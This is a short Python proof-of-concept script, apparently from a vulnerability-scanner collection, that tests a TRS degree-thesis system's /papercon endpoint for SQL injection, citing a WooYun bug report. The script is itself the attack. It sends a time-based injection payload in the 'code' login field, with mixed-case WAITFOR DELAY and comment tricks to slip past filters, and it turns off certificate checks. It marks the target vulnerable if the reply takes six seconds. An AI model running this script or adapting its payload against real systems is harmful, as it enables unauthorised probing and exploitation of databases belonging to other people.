#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS学位论文系统papercon处SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-0124453
author: Lucifer
description: 文件papercon中,参数code存在SQL注入。
'''
import sys
import time
import json
import requests
import warnings
def run(url):
        result = ['TRS学位论文系统papercon处SQL注入','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        post_data ={
            "action":"login",
            "r_code":"%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5",
            "r_password":"%C3%DC%C2%EB%B2%BB%C4%DC%CE%AA%BF%D5",
            "code":"test';WaItFoR/**/DeLay/**/'0:0:6'--",
            "password":"dsdfaf"
        }
        payload = "/papercon"
        vulnurl = url + payload
        start_time = time.time()
        try:
            req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
            if time.time() - start_time >= 6:
                result[2]=  '存在'
                result[1]=vulnurl+"\npost: "+json.dumps(post_data, indent=4)
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
